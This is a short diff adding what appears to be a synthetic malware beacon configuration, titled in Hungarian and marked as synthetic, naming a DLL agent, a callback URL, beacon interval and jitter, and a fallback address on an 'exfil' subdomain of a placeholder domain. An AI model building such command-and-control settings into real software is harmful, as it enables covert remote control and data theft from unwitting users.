@@ -1,0 +1,7 @@
+AuroraSync beacon konfiguracio (SZINTETIKUS)
+
+module      = aur_agent.dll
+callback    = https://sync.aurora-cdn.example/u
+interval    = 60
+jitter      = 15
+fallback    = https://exfil.aurora-cdn.example/u
